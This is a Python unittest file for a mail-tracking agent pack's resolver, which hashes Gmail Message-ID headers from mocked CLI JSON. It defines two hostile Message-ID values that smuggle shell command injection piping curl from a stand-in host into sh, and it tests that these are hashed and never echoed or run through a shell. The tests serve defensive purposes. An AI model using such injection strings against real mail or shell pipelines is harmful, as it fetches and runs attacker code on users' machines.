"""The step-2 resolver: maps item keys to Gmail ids from the exact page the check read, and builds each message's
rfc822: key from gog's own JSON, so the agent never types a header into a shell line."""
import sys, base64, contextlib, hashlib, importlib.util, io, json, os, pathlib, subprocess, tempfile, unittest
from types import SimpleNamespace
from unittest.mock import patch

PACK = pathlib.Path(__file__).resolve().parents[1]
# Both are what an outside sender can put in a Message-ID. RFC 5322 atext allows ` $ { } | and ', so the first is
# a valid id that email-key hashes; the second also holds $( ), which email-key refuses (no parentheses).
HOSTILE = "<`curl${IFS}-s${IFS}evil-mid.example.invalid|sh`'x@Mail.Example.invalid>"
HOSTILE_PARENS = "<$(curl${IFS}evil-mid.example.invalid|sh)'`id`@mail.example.invalid>"


def load(name):
    saved, sys.dont_write_bytecode = sys.dont_write_bytecode, True
    try:
        spec = importlib.util.spec_from_file_location("pack_" + name, PACK / (name + ".py"))
        mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod); return mod
    finally:
        sys.dont_write_bytecode = saved


def key(value):
    return "sha256:" + hashlib.sha256(value.encode()).hexdigest()


def expected_rfc822(header):
    value = header.strip()[1:-1]; local, domain = value.rsplit("@", 1)
    return "rfc822:" + hashlib.sha256((local + "@" + domain.lower()).encode()).hexdigest()


class FakeGmail:
    """A mailbox of 300 messages, newest first, 50 per page; `get` returns headers in Gmail API shape."""
    def __init__(self, headers=None):
        self.calls = []; self.ids = ["m%03d" % n for n in range(300)]; self.headers = headers or {}

    def __call__(self, argv, **kw):
        self.calls.append((argv, kw))
        assert kw.get("timeout") and kw["timeout"] > 0, "every subprocess.run has a timeout"
        assert not kw.get("shell"), "never a shell"
        if argv[1] == "auth":
            return SimpleNamespace(returncode=0, stdout=b'{"accounts":["local"]}', stderr=b"")
        if argv[1:4] == ["gmail", "messages", "search"]:
            start = int(argv[argv.index("--page") + 1]) if "--page" in argv else 0
            chunk = self.ids[start:start + 50]
            page = {"messages": [{"id": i, "threadId": "t" + i, "from": "casey@example.invalid"} for i in chunk]}
            if start + 50 < len(self.ids): page["nextPageToken"] = str(start + 50)
            return SimpleNamespace(returncode=0, stdout=json.dumps(page).encode(), stderr=b"")
        if argv[1:3] == ["gmail", "get"]:
            mid = argv[3]
            header = self.headers.get(mid, "<%s@mail.example.invalid>" % mid)
            msg = {"id": mid, "threadId": "t" + mid, "payload": {"headers": [
                {"name": "From", "value": "Casey <casey@example.invalid>"}, {"name": "Message-ID", "value": header}]}}
            return SimpleNamespace(returncode=0, stdout=json.dumps(msg).encode(), stderr=b"")
        raise AssertionError("unexpected gog call " + repr(argv))


class ResolveTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(); self.addCleanup(self.temp.cleanup)
        root = pathlib.Path(self.temp.name)
        self.saved = os.getcwd(); os.chdir(root); self.addCleanup(os.chdir, self.saved)
        (root / "board").mkdir(); (root / "board/tasks.json").write_text(json.dumps({"contacts": [{"email": "casey@example.invalid"}]}))
        self.state = root / "seen.json"; self.config = root / "config.json"
        self.state.write_text(json.dumps({"keys": {}, "cursor": None})); self.config.write_text("{}")
        env = patch.dict(os.environ, KEEPTRACK_STATE=str(self.state), KEEPTRACK_CONFIG=str(self.config))
        env.start(); self.addCleanup(env.stop)

    def check_on_page(self, fake, page):
        """Run the real check starting at `page` of the window, as a later tick of a busy mailbox would."""
        check = load("check")
        start = base64.urlsafe_b64encode(json.dumps(dict(after=1000, until=2000, page=page)).encode()).decode()
        out = io.StringIO()
        with patch.dict(os.environ, KEEPTRACK_SCAN_CURSOR=start), patch.object(check.shutil, "which", return_value="gog"), \
             patch.object(check.subprocess, "run", side_effect=fake), contextlib.redirect_stdout(out):
            self.assertEqual(check.main(), 0)
        return json.loads(out.getvalue())

    def resolve(self, fake, *args):
        mod = load("resolve")
        out = io.StringIO()
        with patch.object(mod.subprocess, "run", side_effect=fake), contextlib.redirect_stdout(out):
            code = mod.main(list(args))
        return code, out.getvalue()

    def test_maps_keys_from_the_exact_page_the_check_read_in_one_search(self):
        fake = FakeGmail()
        value = self.check_on_page(fake, "250")          # page 6 of the window: past the newest 250 messages
        items = value["items"]; self.assertEqual(len(items), 50)
        refs = {i["ref"] for i in items}; self.assertEqual(len(refs), 1, "one batch, one page, one ref")
        search = [c for c in fake.calls if c[0][1:4] == ["gmail", "messages", "search"]][-1][0]
        fake.calls.clear()
        code, out = self.resolve(fake, refs.pop(), items[0]["key"], items[49]["key"])
        self.assertEqual(code, 0)
        searches = [c[0] for c in fake.calls if c[0][1:4] == ["gmail", "messages", "search"]]
        self.assertEqual(len(searches), 1, "one search call, not a scan from the newest mail")
        self.assertEqual(searches[0][4], search[4], "the check's own query")
        self.assertEqual(searches[0][searches[0].index("--page") + 1], "250", "the check's own page token")
        lines = dict((l.split()[0], l.split()[1:]) for l in out.splitlines())
        self.assertEqual(lines[items[0]["key"]][:2], ["m250", "tm250"])
        self.assertEqual(lines[items[49]["key"]][:2], ["m299", "tm299"])

    def test_page_ref_passes_the_loader_and_falls_back_for_an_overlong_token(self):
        loader = PACK.parents[1] / "keeptrack.py"
        if not loader.is_file(): self.skipTest("keeptrack.py not next to the pack")
        value = self.check_on_page(FakeGmail(), "250")
        saved, sys.dont_write_bytecode = sys.dont_write_bytecode, True
        try:
            spec = importlib.util.spec_from_file_location("kt_loader", loader)
            kt = importlib.util.module_from_spec(spec); spec.loader.exec_module(kt)
        finally:
            sys.dont_write_bytecode = saved
        kt._auto_result(value)                     # raises on a ref the loader refuses
        self.assertIsNone(load("check").page_ref(1, 2, "9" * 200))

    def test_hostile_message_id_is_hashed_from_gog_json_and_never_printed(self):
        fake = FakeGmail({"m010": HOSTILE, "m011": HOSTILE_PARENS})
        value = self.check_on_page(fake, None)
        items = {i["key"]: i for i in value["items"]}
        fake.calls.clear()
        code, out = self.resolve(fake, items[key("m010")]["ref"], key("m010"), key("m011"))
        self.assertEqual(code, 0)
        self.assertEqual(out.splitlines(), [" ".join([key("m010"), "m010", "tm010", expected_rfc822(HOSTILE)]),
                                            " ".join([key("m011"), "m011", "tm011", "no-message-id"])])
        for leak in ("curl", "IFS", "evil", "$", "`", "'", "@", "|"): self.assertNotIn(leak, out)
        gets = [c[0] for c in fake.calls if c[0][1:3] == ["gmail", "get"]]
        self.assertEqual(gets, [["gog", "gmail", "get", "m010", "--json"], ["gog", "gmail", "get", "m011", "--json"]])

    def test_message_id_shapes_and_missing_header(self):
        mod = load("resolve")
        self.assertEqual(mod.message_id({"headers": {"Message-Id": "<a@B.example>"}}), "<a@B.example>")
        self.assertEqual(mod.message_id({"message": {"payload": {"headers": [{"name": "message-id", "value": "<a@b>"}]}}}), "<a@b>")
        self.assertIsNone(mod.message_id({"id": "abc", "messageId": "18f2a01c9be0d4a1"}), "a Gmail id is not a Message-ID")
        self.assertEqual(mod.rfc822("<a@B.example>"), expected_rfc822("<a@B.example>"))
        for bad in ("", "no-at-sign", "<a@b@c>", "<a b@c>", "x" * 1000 + "@d", "<(x)@d>"):
            self.assertIsNone(mod.rfc822(bad), bad)
        fake = FakeGmail({"m001": ""})
        item = [i for i in self.check_on_page(fake, None)["items"] if i["key"] == key("m001")][0]
        code, out = self.resolve(fake, item["ref"], item["key"])
        self.assertEqual(out.split(), [key("m001"), "m001", "tm001", "no-message-id"])

    def test_unknown_key_is_reported_and_day_mode_is_bounded(self):
        fake = FakeGmail()
        ref = self.check_on_page(fake, None)["items"][0]["ref"]
        fake.calls.clear()
        code, out = self.resolve(fake, ref, key("deleted"))
        self.assertEqual(out.split(), [key("deleted"), "not-found"])
        self.assertEqual(len(fake.calls), 1, "no wider search: the page is the answer")
        fake.calls.clear()
        code, out = self.resolve(fake, "--day", "2026-10-14", key("m120"), key("nowhere"))
        searches = [c[0] for c in fake.calls if c[0][1:4] == ["gmail", "messages", "search"]]
        self.assertLessEqual(len(searches), 10)
        self.assertIn("after:1791849600", searches[0][4]); self.assertIn("before:1792108800", searches[0][4])
        self.assertIn(key("m120") + " m120 tm120 rfc822:", out); self.assertIn(key("nowhere") + " not-found", out)

    def test_gog_failure_and_timeout_stop_with_a_code(self):
        mod = load("resolve")
        ref = "pg:" + base64.urlsafe_b64encode(json.dumps({"a": 1, "u": 2, "p": None}).encode()).decode()
        def expired(argv, **kw):
            self.assertIn("timeout", kw)
            return SimpleNamespace(returncode=1, stdout=b"", stderr=b"oauth2: token expired")
        code, out = self.resolve(expired, ref, key("x"))
        self.assertEqual(code, 3); self.assertIn("gog-error", out)
        def hang(argv, **kw):
            raise subprocess.TimeoutExpired(argv, kw["timeout"])
        code, out = self.resolve(hang, ref, key("x"))
        self.assertEqual(code, 3); self.assertIn("gog-timeout", out)
        code, out = self.resolve(FakeGmail(), "not-a-ref", key("x"))
        self.assertEqual(code, 2)


class SkillTest(unittest.TestCase):
    def test_skill_never_has_the_agent_type_a_header_or_scan_the_mailbox(self):
        text = (PACK / "SKILL.md").read_text()
        self.assertIn("resolve.py", text)
        self.assertNotIn("sys.stdin.read().strip().strip", text, "no hand-fed Message-ID hashing")
        self.assertNotIn("range(20)", text, "no open-ended scan from the newest mail")
        self.assertIn("<<'", text)
        for block in text.split("```sh")[1:]:
            block = block.split("```")[0]
            if "subprocess.run(" in block: self.assertIn("timeout=", block)


if __name__ == "__main__":
    unittest.main()
